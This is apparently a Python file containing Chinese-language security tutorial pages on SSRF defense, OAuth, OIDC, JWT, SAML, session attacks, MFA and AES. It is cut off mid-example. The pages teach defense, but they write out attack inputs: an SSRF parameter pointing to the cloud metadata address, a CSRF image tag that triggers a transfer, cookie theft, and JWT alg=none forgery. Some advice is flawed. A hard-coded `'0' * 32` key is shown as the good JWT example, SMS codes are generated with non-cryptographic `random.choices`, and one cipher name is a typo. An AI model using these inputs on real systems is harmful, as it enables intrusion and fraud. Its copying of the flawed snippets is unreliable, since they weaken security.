ALLOWED_HOSTS = {"cdn.example.com", "images.example.com"}

@app.get("/fetch-image")
def fetch_image(url: str):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise HTTPException(400, "Invalid host")
    return requests.get(url).content
```

### 2. 解析 IP + 禁用内网

```python
import ipaddress
import socket

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    try:
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        # 禁用私有 / 回环 / 链路本地
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False
        return True
    except:
        return False
```

### 3. 协议限制

```python
# 仅允许 HTTP / HTTPS
if parsed.scheme not in ("http", "https"):
    return False
```

### 4. 隔离网络

```yaml
# K8s NetworkPolicy：限制应用 Pod 出网
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress
spec:
  policyTypes: [Egress]
  podSelector: {}
  egress:
    - to:  # 仅允许外部 CDN
        - namespaceSelector:
            matchLabels:
              name: cdn
```

### 5. 关闭云元数据 v1

```bash
# AWS EC2
# 强制 IMDSv2（必须带 token 才能读）
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

## 实战：CAPTCHA 绕过 / 验证码供应商

```python
# 常见：验证码服务给你一个 URL 让服务端拉
# 攻击者构造：?captcha_url=http://169.254.169.254/...
```

## 关联章节

- **01-web-top10/a05-misconfig**：A05 配置错误常引发 SSRF
- **cloud-native** → NetworkPolicy 隔离
- **05-container/overview**：容器网络隔离

## 一句话总结

> **A10 SSRF = 服务器替你请求**。**核心：URL 白名单 + 解析 IP 校验 + 禁用内网 + 强制 IMDSv2**。**AWS 凭证泄漏 = 灾难级**。
""",

# ============ 02-auth (6 stubs) ============
"02-auth/oauth2.md": """---
title: OAuth 2.0 详解
---

# OAuth 2.0 详解

## 一句话总结

> **OAuth 2.0 = 授权框架**（不是认证）。**核心：让第三方应用代表用户访问资源**。**4 种 flow：authorization code（最常用）/ client credentials / implicit（废弃）/ password（遗留）**。**PKCE 强制要求**。

---

## 为什么需要 OAuth 2.0

```
┌────────────────────────────────────────┐
│  场景：照片打印 App 想访问你的 Google Photos│
├────────────────────────────────────────┤
│  ❌ 不用 OAuth：                        │
│     用户把 Google 密码给打印 App（危险）│
│  ✅ 用 OAuth：                          │
│     Google 授权打印 App 一个受限的 token│
│     用户随时可撤销                       │
└────────────────────────────────────────┘
```

## 4 个角色

| 角色 | 例子 |
|------|------|
| **Resource Owner** | 用户（你） |
| **Client** | 照片打印 App |
| **Authorization Server** | Google OAuth Server |
| **Resource Server** | Google Photos API |

## 4 种 Flow 对比

| Flow | 适用 | 客户端 | 关键 |
|------|------|--------|------|
| **Authorization Code** | Web 应用 | 服务端 | 最安全 |
| **Authorization Code + PKCE** | 移动 App / SPA | 公共客户端 | 防 code 拦截 |
| **Client Credentials** | M2M | 后端服务 | 无用户 |
| **Password** | 遗留迁移 | 受信第一方 | 不推荐 |
| **Device Code** | TV / IoT | 无浏览器 | 用户在另一端 |

## 实战：Authorization Code Flow

```
1. 用户点"用 Google 登录"
   GET /authorize?
     response_type=code
     &client_id=app123
     &redirect_uri=https://app.com/callback
     &scope=openid+profile+email
     &state=xyz123
     &code_challenge=BASE64URL(SHA256(verifier))
     &code_challenge_method=S256

2. Google 登录 + 同意 → 302 redirect
   https://app.com/callback?
     code=abc123
     &state=xyz123

3. App 后端用 code 换 token
   POST /token
     grant_type=authorization_code
     &code=abc123
     &redirect_uri=https://app.com/callback
     &client_id=app123
     &client_secret=xxx
     &code_verifier=original_verifier

4. Google 返回
   {
     "access_token": "...",
     "refresh_token": "...",
     "id_token": "...",
     "expires_in": 3600
   }
```

## 实战：PKCE（防 code 拦截）

```python
import secrets, hashlib, base64

# 1. 生成 verifier 和 challenge
verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b'=').decode()
challenge = base64.urlsafe_b64encode(
    hashlib.sha256(verifier.encode()).digest()
).rstrip(b'=').decode()

# 2. 跳转授权时带 challenge
authorize_url = f"https://oauth.provider.com/authorize?code_challenge={challenge}&code_challenge_method=S256"

# 3. 换 token 时带 verifier
token = requests.post("https://oauth.provider.com/token", data={
    "grant_type": "authorization_code",
    "code": code,
    "code_verifier": verifier,
    "client_id": "app123",
    "redirect_uri": "https://app.com/callback",
})
```

## 实战：Spring Authorization Server 配置

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: xxx.apps.googleusercontent.com
            client-secret: xxx
            scope: openid, profile, email
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
        provider:
          google:
            authorization-uri: https://accounts.google.com/o/oauth2/v2/auth
            token-uri: https://oauth2.googleapis.com/token
```

## 实战：常见陷阱

| 陷阱 | 危害 |
|------|------|
| redirect_uri 未校验 | 钓鱼攻击 |
| client_secret 泄漏 | 攻击者伪造请求 |
| 不校验 state | CSRF 攻击 |
| scope 过大 | 权限过度 |
| 不验证 audience | confused deputy |
| 不用 PKCE | mobile/SPA 拦截 |

## 关联章节

- **02-auth/oidc**：OIDC = OAuth 2.0 + 身份
- **02-auth/jwt**：access_token 通常是 JWT
- **02-auth/session-attack**：传统 Session 攻击

## 一句话总结

> **OAuth 2.0 = 授权（不是认证）**。**Web 用 Authorization Code + PKCE**。**M2M 用 Client Credentials**。**永远验证 redirect_uri 和 state**。
""",

"02-auth/oidc.md": """---
title: OpenID Connect（OIDC）详解
---

# OpenID Connect（OIDC）

## 一句话总结

> **OIDC = OAuth 2.0 + 身份层**。**核心：ID Token（JWT 格式身份断言）+ UserInfo Endpoint**。**3 个流派：Auth0 / Keycloak / Spring Authorization Server**。**现代 SSO / SaaS 标配**。

---

## OAuth 2.0 vs OIDC

| 维度 | OAuth 2.0 | OIDC |
|------|-----------|------|
| 目的 | 授权 | 身份认证 |
| 令牌 | access_token | access_token + id_token |
| 用户信息 | 无 | ID Token + UserInfo |
| 标准 | RFC 6749 | OpenID Connect Core 1.0 |

## ID Token = JWT 身份断言

```json
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",
  "aud": "client-id",
  "exp": 1691678400,
  "iat": 1691674800,
  "auth_time": 1691674800,
  "nonce": "abc123",
  "name": "Alice",
  "email": "alice@example.com",
  "email_verified": true,
  "picture": "https://..."
}
```

| 字段 | 含义 |
|------|------|
| `iss` | 颁发者（Authorization Server URL）|
| `sub` | 用户唯一 ID |
| `aud` | 客户端 ID |
| `exp` | 过期时间 |
| `iat` | 颁发时间 |
| `nonce` | 防重放（必须绑定）|

## 实战：OIDC 登录流程

```
1. 用户点击"用 Google 登录"
   GET /authorize?
     response_type=code
     &scope=openid+profile+email  ← 关键：openid scope
     &client_id=xxx
     &redirect_uri=https://app.com/callback
     &nonce=random123  ← 防 replay

2. Google 登录 + 同意 → 返回 code

3. 后端用 code 换 token
   {
     "access_token": "...",
     "id_token": "...",  ← JWT 身份
     "refresh_token": "..."
   }

4. 验证 ID Token
   - 检查 iss == "https://accounts.google.com"
   - 检查 aud == client_id
   - 检查 exp > now
   - 检查 nonce == random123
   - 用 JWKS 验证签名
```

## 实战：前端解析 ID Token

```javascript
// OIDC 客户端库（oidc-client-ts）
const userManager = new UserManager({
  authority: "https://accounts.google.com",
  client_id: "xxx.apps.googleusercontent.com",
  redirect_uri: "https://app.com/callback",
  response_type: "code",
  scope: "openid profile email",
});

userManager.signinRedirect();
// 登录完成后自动获取 id_token
const user = await userManager.getUser();
console.log(user.profile);  // 用户信息
```

## 实战：后端校验 ID Token

```python
import jwt
from jwt import PyJWKClient

jwks_client = PyJWKClient("https://accounts.google.com/.well-known/jwks.json")

def verify_id_token(id_token: str, client_id: str, nonce: str):
    signing_key = jwks_client.get_signing_key_from_jwt(id_token)
    payload = jwt.decode(
        id_token,
        signing_key.key,
        algorithms=["RS256"],
        audience=client_id,
        issuer="https://accounts.google.com",
    )
    if payload["nonce"] != nonce:
        raise ValueError("Invalid nonce")
    return payload
```

## 实战：OIDC Discovery

每个 OIDC 提供商都暴露 `.well-known/openid-configuration`：

```json
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "scopes_supported": ["openid", "email", "profile"],
  "response_types_supported": ["code", "id_token", "token id_token"]
}
```

## OIDC 提供商对比

| 提供商 | 特点 | 适合 |
|--------|------|------|
| **Auth0** | 商业、SaaS 领先 | 中小企业 |
| **Keycloak** | 开源、CNCF 沙箱 | 自托管 / 企业 |
| **Okta** | 商业、企业级 | 大企业 |
| **AWS Cognito** | AWS 生态 | AWS 架构 |
| **Spring Authorization Server** | Java 开源 | Spring 项目 |
| **Ory Hydra** | Go 开源 | 云原生 |

## 关联章节

- **02-auth/oauth2**：OAuth 2.0 基础
- **02-auth/jwt**：JWT 详细结构
- **02-auth/saml**：SAML 企业 SSO（XML 时代）

## 一句话总结

> **OIDC = OAuth 2.0 + ID Token（JWT）**。**关键 scope：openid**。**三件套：authorization / token / userinfo**。**前端 SPA 用 oidc-client-ts，后端用 JWKS 验证签名**。
""",

"02-auth/jwt.md": """---
title: JWT 详解
---

# JWT（JSON Web Token）详解

## 一句话总结

> **JWT = 自包含的令牌**（Header + Payload + Signature）**。**3 类算法：HS256（对称）/ RS256（非对称）/ ES256（椭圆曲线）**。**优势：无状态 / 跨域 / 可携信息**。**陷阱：注销难 / 体积大 / 不能放敏感数据**。

---

## JWT 结构

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.  ← Header
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIn0.  ← Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

### Header（算法 + 类型）

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload（声明）

```json
{
  "iss": "https://auth.example.com",
  "sub": "user_123",
  "aud": "api.example.com",
  "exp": 1691678400,
  "iat": 1691674800,
  "jti": "abc-123",
  "scope": "read:user write:user",
  "role": "admin"
}
```

### Signature

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

## 3 类签名算法

| 算法 | 密钥 | 性能 | 场景 |
|------|------|------|------|
| **HS256** | 共享密钥 | 快 | 单体应用 |
| **RS256** | RSA 公私钥 | 慢 | 多服务验证 |
| **ES256** | ECDSA 公私钥 | 极快 | 现代推荐 |
| **EdDSA** | Ed25519 | 极快 | 高安全 |

## 实战：Python 用 JWT

```python
import jwt
from datetime import datetime, timedelta

# 签发
payload = {
    "sub": "user_123",
    "role": "admin",
    "exp": datetime.utcnow() + timedelta(hours=1),
    "iat": datetime.utcnow(),
}
token = jwt.encode(payload, "secret", algorithm="HS256")

# 验证
try:
    decoded = jwt.decode(token, "secret", algorithms=["HS256"])
except jwt.ExpiredSignatureError:
    return "Token expired"
except jwt.InvalidTokenError:
    return "Invalid token"
```

## 实战：RS256（非对称，微服务场景）

```bash
# 1. 生成密钥对
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 2. Auth Server 用 private 签
# 3. Resource Server 用 public 验（无需密钥协商）
```

```java
// Auth Server 签发
String jwt = Jwts.builder()
    .setSubject("user_123")
    .signWith(SignatureAlgorithm.RS256, privateKey)
    .compact();

// Resource Server 验证
Jws<Claims> claims = Jwts.parserBuilder()
    .setSigningKey(publicKey)
    .build()
    .parseClaimsJws(jwt);
```

## 实战：JWT 攻击 + 防御

### 攻击 1：none 算法

```python
# ❌ 漏洞：允许 alg=none
header = {"alg": "none", "typ": "JWT"}
# 攻击者构造无签名 token
# 某些库会接受

# ✅ 防御：强制验证算法
jwt.decode(token, key, algorithms=["HS256"])  # 显式指定
```

### 攻击 2：算法混淆

```python
# 攻击者用公钥当 HMAC 密钥（前提：服务端误用 RS256 公钥做 HS256 验签）
# 攻击 payload：alg=HS256
# HMAC token with public_key

# ✅ 防御：显式验证算法，不让攻击者切换
```

### 攻击 3：弱密钥

```python
# ❌ 密钥太短
jwt.encode(payload, "secret", algorithm="HS256")

# ✅ 至少 256 bit
jwt.encode(payload, "0" * 32, algorithm="HS256")
```

### 防御清单

| 措施 | 落地 |
|------|------|
| 强制算法 | 显示传入 `algorithms=["HS256"]` |
| 短 TTL | access_token 15 min、refresh_token 7 天 |
| 黑名单 | 注销时加入 Redis blacklist |
| HTTPS 强制 | 防中间人 |
| 不放敏感数据 | Payload 是 base64 不是加密 |
| 密钥轮换 | 季度轮换 |

## 实战：JWT 注销

```python
# JWT 默认无状态，注销难
# 方案：黑名单 + Redis
def revoke_jwt(jti: str):
    redis.setex(f"jwt:revoked:{jti}", remaining_ttl, "1")

# 验证时检查
def is_revoked(jti: str) -> bool:
    return redis.exists(f"jwt:revoked:{jti}")
```

## 实战：Spring Security JWT 过滤器

```java
@Component
public class JwtFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain) {
        String token = extractToken(req);
        if (token != null) {
            Claims claims = Jwts.parserBuilder()
                .setSigningKey(publicKey)
                .build()
                .parseClaimsJws(token)
                .getBody();
            // 验证黑名单
            if (jwtBlacklist.isRevoked(claims.getId())) {
                throw new JwtException("Revoked");
            }
            SecurityContextHolder.getContext().setAuthentication(
                new JwtAuthentication(claims)
            );
        }
        chain.doFilter(req, res);
    }
}
```

## 关联章节

- **02-auth/oauth2**：OAuth 2.0 access_token 通常是 JWT
- **02-auth/oidc**：OIDC ID Token = JWT
- **01-web-top10/a07-auth-failure**：A07 认证失效

## 一句话总结

> **JWT = 自包含令牌**。**单体用 HS256，微服务用 RS256/ES256**。**不存敏感数据，强制算法白名单，TTL 短**。**注销用黑名单**。
""",

"02-auth/saml.md": """---
title: SAML 2.0
---

# SAML 2.0（企业 SSO）

## 一句话总结

> **SAML = Security Assertion Markup Language**。**基于 XML 的企业 SSO 标准**。**核心：SP（应用）+ IdP（身份提供商）+ SAML Assertion（XML 签名断言）**。**现代被 OIDC 取代，但企业 / 政府仍广泛使用**。

---

## SAML 角色

| 角色 | 例子 |
|------|------|
| **User** | 员工 |
| **SP**（Service Provider） | Salesforce / Workday / 自研应用 |
| **IdP**（Identity Provider） | ADFS / Okta / Ping Identity |
| **SAML Assertion** | XML 形式的"我是 Alice"声明 |

## SAML 流程（SP-Initiated）

```
1. 用户访问 SP 应用
   https://app.example.com

2. SP 生成 SAML Request
   <samlp:AuthnRequest>
     <Issuer>https://app.example.com</Issuer>
   </samlp:AuthnRequest>

3. 用户跳到 IdP
   https://idp.example.com/sso?SAMLRequest=base64...

4. IdP 登录（首次需要）
   已有 session → 跳过

5. IdP 生成 SAML Assertion 并签名
   <saml:Assertion>
     <Issuer>https://idp.example.com</Issuer>
     <Subject>alice@example.com</Subject>
     <AttributeStatement>
       <Attribute Name="role">admin</Attribute>
     </AttributeStatement>
   </saml:Assertion>

6. 用户 POST 给 SP
   POST /saml/acs
   SAMLResponse=base64(xxx)

7. SP 验证签名 + 创建 session
```

## SAML Assertion 样例

```xml
<saml:Assertion
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="abc123"
    Version="2.0"
    IssueInstant="2026-08-10T10:30:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <ds:Signature>
    <!-- IdP 私钥签名 -->
  </ds:Signature>
  <saml:Subject>
    <saml:NameID>alice@example.com</saml:NameID>
  </saml:Subject>
  <saml:Conditions NotBefore="..." NotOnOrAfter="..."/>
  <saml:AttributeStatement>
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

## 实战：Spring Security SAML 配置

```java
@Configuration
public class SamlConfig {
    @Bean
    public Saml2AuthenticationProvider samlProvider() {
        OpenSaml4AuthenticationProvider provider = new OpenSaml4AuthenticationProvider();
        provider.setResponseAuthenticationConverter(responseToken -> {
            // 自定义断言转换
            return ...;
        });
        return provider;
    }
}
```

```yaml
spring:
  security:
    saml2:
      relyingparty:
        registration:
          adfs:
            entity-id: https://app.example.com
            assertingparty:
              metadata-uri: https://idp.example.com/metadata
            singlelogout:
              binding: POST
              response-url: "{baseUrl}/logout/saml2/slo"
```

## 实战：NestJS SAML

```typescript
import { PassportStrategy } from '@nestjs/passport';
import { Strategy } from 'passport-saml';
import * as fs from 'fs';

@Injectable()
export class SamlStrategy extends PassportStrategy(Strategy) {
  constructor() {
    super({
      entryPoint: 'https://idp.example.com/sso',
      issuer: 'https://app.example.com',
      callbackUrl: 'https://app.example.com/auth/saml/callback',
      cert: fs.readFileSync('idp.crt', 'utf-8'),
      identifierFormat: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress',
    });
  }
}
```

## SAML vs OIDC 选型

| 维度 | SAML | OIDC |
|------|------|------|
| 格式 | XML | JSON |
| 协议 | SOAP / Redirect / POST | JSON / HTTP |
| 移动友好 | 差 | 好 |
| 现代浏览器 | 慢 | 快 |
| 企业传统 | 主流 | 主流 |
| 调试 | 难 | 易 |
| 中小企业 | 旧 | 新 |

## 实战：SAML 攻击

| 攻击 | 危害 |
|------|------|
| 签名剥离 | 验证失败 |
| XML 签名包装（XSW） | 升级攻击 |
| 受众限制缺失 | confused deputy |
| 断言重放 | 一次性 nonce |
| 接收方未校验 | 任意 IdP 接受 |

## 防御清单

| 措施 | 落地 |
|------|------|
| 强制签名 | 拒绝无签名 Assertion |
| 验证 issuer | 限定白名单 IdP |
| 验证 audience | 确保 SP 期望 |
| 验证时间窗口 | NotOnOrAfter 检查 |
| 唯一 Assertion ID | 防 replay |
| TLS 强制 | 防中间人 |

## 关联章节

- **02-auth/oidc**：OIDC 替代 SAML（现代）
- **02-auth/oauth2**：OAuth 2.0 基础
- **architecture**：企业 SSO 集成

## 一句话总结

> **SAML = 企业 SSO XML 标准**。**SP + IdP + Assertion。**新项目用 OIDC，老系统集成用 SAML**。**核心：签名验证 + audience + 唯一 ID**。
""",

"02-auth/session-attack.md": """---
title: Session 攻击
---

# Session 攻击矩阵

## 一句话总结

> **Session = 服务端识别用户身份**。**4 大攻击：Session 固定 / 劫持 / 伪造 / CSRF**。**防御：HttpOnly + Secure + SameSite + 短 TTL + 重新生成**。

---

## Session 4 大攻击

### 1. Session 固定（Session Fixation）

```python
# 攻击者先获取一个 session_id
# 然后诱导用户用这个 session_id 登录
# 用户登录后，session_id 不变 → 攻击者接管

# 攻击流程
1. 攻击者访问 https://app.com → 拿到 session_id=ATTACKER_SESSION
2. 攻击者诱导用户：https://app.com/?session_id=ATTACKER_SESSION
3. 用户登录，session_id 不变
4. 攻击者用 ATTACKER_SESSION 接管账号
```

```python
# ✅ 防御：登录后重新生成 session_id
@app.post("/login")
def login(req: LoginRequest, response: Response):
    user = authenticate(req)
    session.regenerate()  # ← 关键
    session["user_id"] = user.id
    return {"token": session.id}
```

### 2. Session 劫持（Session Hijacking）

```python
# 攻击者通过 XSS / 网络嗅探 / 物理访问 拿到 session_id

# XSS 攻击
document.cookie  // 偷 cookie
# 防御：HttpOnly（JavaScript 无法访问）

# 中间人攻击
# 嗅探 HTTP 流量拿到 session_id
# 防御：HTTPS + Secure cookie
```

```python
# ✅ 防御
response.set_cookie(
    "session_id",
    value=session_id,
    httponly=True,    # 防止 XSS 偷 cookie
    secure=True,      # 只走 HTTPS
    samesite="strict", # 防 CSRF
)
```

### 3. Session 伪造（Session Forgery）

```python
# 攻击者构造假的 session_id（前提：算法被猜到）

# ❌ 弱 session_id
session_id = "user123"  # 可预测

# ✅ 加密随机
import secrets
session_id = secrets.token_urlsafe(32)  # 256 bit 不可预测
```

### 4. CSRF（Cross-Site Request Forgery）

```html
<!-- 攻击者网站诱导用户发起请求 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- 用户的银行 cookie 自动附上 -->
```

```python
# ✅ 防御：SameSite Cookie + CSRF Token
response.set_cookie("session_id", ..., samesite="strict")

# 或 CSRF Token
@app.post("/transfer")
def transfer(req: TransferRequest, csrf_token: str = Header(...)):
    if csrf_token != session["csrf_token"]:
        raise HTTPException(403, "CSRF token mismatch")
    return do_transfer(req)
```

## 实战：Spring Security Session 配置

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement(session -> session
                .sessionFixationProtection()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .maximumSessions(1)  // 单点登录
                .maxSessionsPreventsLogin(false)
            )
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}
```

## 实战：分布式 Session

### 方案 1：Redis 集中存储

```python
# Spring Session
spring.session.store-type=redis
spring.session.redis.namespace=myapp:session

# 多个应用实例共享 Redis
```

### 方案 2：JWT 替代

```python
# 完全无状态（JWT 自包含）
# 缺点：注销难、不能改
```

### 方案 3：粘性 Session

```nginx
# Nginx ip_hash
upstream backend {
    ip_hash;
    server backend1;
    server backend2;
}
# 缺点：负载不均
```

## 安全清单

| 措施 | 落地 |
|------|------|
| HttpOnly | 防 XSS |
| Secure | 仅 HTTPS |
| SameSite=Strict | 防 CSRF |
| 短 TTL | 30 分钟过期 |
| 重新生成 | 登录后 regen |
| 强随机 | secrets.token_urlsafe(32) |
| 多 session 限制 | 单点登录 |
| 异常检测 | 新地点告警 |

## 关联章节

- **02-auth/oauth2**：OAuth 2.0 替代 Session
- **02-auth/jwt**：JWT 替代 Session
- **01-web-top10/a07-auth-failure**：A07 认证失效

## 一句话总结

> **Session 4 大攻击 = 固定 / 劫持 / 伪造 / CSRF**。**防御：HttpOnly + Secure + SameSite + 重新生成 + 强随机**。**分布式 Session 用 Redis**。
""",

"02-auth/mfa.md": """---
title: MFA 多因素认证
---

# MFA 多因素认证

## 一句话总结

> **MFA = 多因素认证**（密码 + 第二个因子）**。**3 因子：知识（密码）/ 持有（手机）/ 物理特征（指纹）**。**3 种实现：TOTP（短信/Authenticator）/ WebAuthn（FIDO2 硬件密钥）/ Push（Auth0 Guardian）**。**强 MFA = 99.9% 防账号接管**。

---

## 3 因子 + 4 主流实现

| 因子 | 例子 |
|------|------|
| **知识** | 密码 / PIN / 密保问题 |
| **持有** | 手机 / 硬件密钥 / 智能卡 |
| **物理特征** | 指纹 / 面部 / 虹膜 |

| MFA 方式 | 用户体验 | 安全性 | 成本 |
|---------|---------|--------|------|
| **短信验证码** | ★★★★★ | ★★ | 低 |
| **TOTP（Authenticator）** | ★★★★ | ★★★ | 低 |
| **Push 通知** | ★★★★ | ★★★ | 中 |
| **WebAuthn / FIDO2** | ★★★ | ★★★★★ | 中 |
| **硬件密钥（YubiKey）** | ★★★ | ★★★★★ | 高 |

## 实战：TOTP（Google Authenticator）

```python
import pyotp

# 用户注册：生成 secret
secret = pyotp.random_base32()
db.user.update(secret=secret)

# 生成 QR code（用户扫码）
import qrcode
uri = pyotp.totp.TOTP(secret).provisioning_uri(
    name=user.email,
    issuer_name="MyApp"
)
qrcode.make(uri).save("qr.png")

# 登录验证
@app.post("/login-mfa")
def verify_mfa(user_id: int, code: str):
    secret = db.user.get(user_id).secret
    totp = pyotp.TOTP(secret)
    if totp.verify(code, valid_window=1):  # ±30 秒
        return "Login success"
    return "Invalid"
```

## 实战：WebAuthn（FIDO2）

```javascript
// 注册
const credential = await navigator.credentials.create({
    publicKey: {
        challenge: new Uint8Array([...]),
        rp: { name: "MyApp" },
        user: {
            id: new Uint8Array([...]),
            name: "alice@example.com",
            displayName: "Alice"
        },
        pubKeyCredParams: [
            { type: "public-key", alg: -7 }  // ES256
        ],
    }
});

// 登录
const assertion = await navigator.credentials.get({
    publicKey: {
        challenge: new Uint8Array([...]),
        allowCredentials: [{ type: "public-key", id: credentialId }],
    }
});
```

## 实战：SMS 验证码（次优）

```python
import random

# 1. 生成 6 位
code = "".join(random.choices("0123456789", k=6))

# 2. 存 Redis（5 分钟过期）
redis.setex(f"sms:code:{phone}", 300, code)

# 3. 发短信
send_sms(phone, f"您的验证码：{code}，5 分钟内有效")

# 4. 验证
@app.post("/verify-sms")
def verify(phone: str, code: str):
    stored = redis.get(f"sms:code:{phone}")
    if stored and stored.decode() == code:
        redis.delete(f"sms:code:{phone}")
        return "OK"
    raise HTTPException(400, "Invalid")
```

## 实战：SMS 嗅探攻击 + 防御

| 攻击 | 防御 |
|------|------|
| SIM 卡交换 | 运营商 PIN / 强身份验证 |
| SS7 协议嗅探 | 不用 SMS |
| 短信木马 | 不用 SMS |
| 钓鱼 | 用户教育 |

**结论**：SMS MFA 不安全，**优先 TOTP / WebAuthn**。

## 实战：风险感知 MFA

```python
def require_mfa(user, request):
    if mfa_check_required(user, request):
        # 强制 MFA
        ...
    else:
        # 跳过 MFA（信任设备）
        ...

def mfa_check_required(user, request):
    # 设备不在白名单
    if not is_trusted_device(user, request.device_id):
        return True
    # 新地点
    if geo_distance(user.last_login_geo, request.geo) > 1000:
        return True
    # 5 个月内没 MFA
    if user.last_mfa_at < datetime.now() - timedelta(days=150):
        return True
    return False
```

## 实战：Spring Security MFA

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasAuthority("MFA_VERIFIED")
        )
        .addFilterAfter(new MfaFilter(), BasicAuthenticationFilter.class);
    return http.build();
}
```

## 实战：恢复码（Backup Codes）

```python
# 用户首次开 MFA 时生成 10 个一次性恢复码
recovery_codes = [secrets.token_hex(8) for _ in range(10)]
db.user.update(recovery_codes=recovery_codes)

# 用一次就标记
def use_recovery_code(user, code):
    codes = db.user.get(user).recovery_codes
    if code in codes:
        codes.remove(code)
        db.user.update(recovery_codes=codes)
        return True
    return False
```

## 关联章节

- **02-auth/overview**：认证协议地图
- **01-web-top10/a07-auth-failure**：A07 认证失效
- **01-web-top10/a04-insecure-design**：A04 不安全设计

## 一句话总结

> **MFA = 密码 + 第二因子**。**优先 TOTP / WebAuthn，避免 SMS**。**强 MFA = 99.9% 防账号接管**。**高敏操作（转账 / 改密）= 强制 MFA**。
""",

# ============ 03-crypto (5 stubs) ============
"03-crypto/symmetric.md": """---
title: 对称加密
---

# 对称加密

## 一句话总结

> **对称加密 = 加解密用同一密钥**。**两大主流：AES-256-GCM（标准）/ ChaCha20-Poly1300（移动 ARM）**。**实战必备：nonce/IV 唯一 + Authenticated Encryption（AEAD）**。

---

## 主流算法

| 算法 | 块/流 | 密钥长度 | 性能 | 场景 |
|------|-------|---------|------|------|
| **AES-256-GCM** | 块（128 bit） | 256 bit | 极快 + 硬件 AES-NI | 通用首选 |
| **ChaCha20-Poly1305** | 流 | 256 bit | 移动 ARM 更快 | 移动 / IoT |
| **AES-128-GCM** | 块 | 128 bit | 极快 | 通用 |
| **3DES** | 块 | 168 bit | 慢 | 遗留 |
| **DES** | 块 | 56 bit | 已破 | 禁用 |

## AES 5 种模式

| 模式 | 特点 | 推荐 |
|------|------|------|
| **ECB** | 每块独立（不安全）| ❌ 禁用 |
| **CBC** | 链式，需 padding | ❌ 不推荐 |
| **CTR** | 计数器流模式 | ❌ 不带认证 |
| **GCM** | CTR + 认证（AEAD）| ✅ 推荐 |
| **CCM** | CTR + CBC-MAC | ✅ 嵌入式 |

## 实战：Python AES-GCM

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

# 1. 生成密钥（32 字节 = 256 bit）
key = AESGCM.generate_key(bit_length=256)

# 2. 加密
aesgcm = AESGCM(key)
nonce = os.urandom(12)  # 12 字节（96 bit）唯一值
plaintext = b"secret message"
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)
# ciphertext = nonce + ciphertext + tag

# 3. 解密
plaintext = aesgcm.decrypt(nonce, ciphertext, associated_data=None)
```

## 实战：Java AES-GCM

```java
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;

public byte[] encrypt(byte[] plaintext, byte[] key) throws Exception {
    SecureRandom random = new SecureRandom();
    byte[] nonce = new byte[12];
    random.nextBytes(nonce);

    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
    GCMParameterSpec gcmSpec = new GCMParameterSpec(128, nonce);

    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
    return cipher.doFinal(plaintext);
}
```

## 实战：Go ChaCha20-Poly1305

```go
import (
    "crypto/chacha20poly1305"
    "crypto/rand"
    "io"
)

func encrypt(plaintext, key []byte) (nonce, ciphertext []byte) {
    aead, _ := chacha20poly1305.NewX(key)
    nonce = make([]byte, aead.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    ciphertext = aead.Seal(nil, nonce, plaintext, nil)
    return
}
```

## 关键陷阱

| 陷阱 | 危害 | 防御 |
|------|------|------|
| **IV / nonce 重用** | 加密失效 | 密码学安全随机 |
| **ECB 模式** | 图像可识别 | 不用 |
| **缺失认证** | 篡改不可知 | 用 GCM / CCM |
| **密钥硬编码** | Git 泄漏 | KMS / Vault |
| **密钥长度不足** | 暴力破解 | 至少 256 bit |

## 密钥派生（KDF）

```python
# 从密码派生密钥（PBKDF2）
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
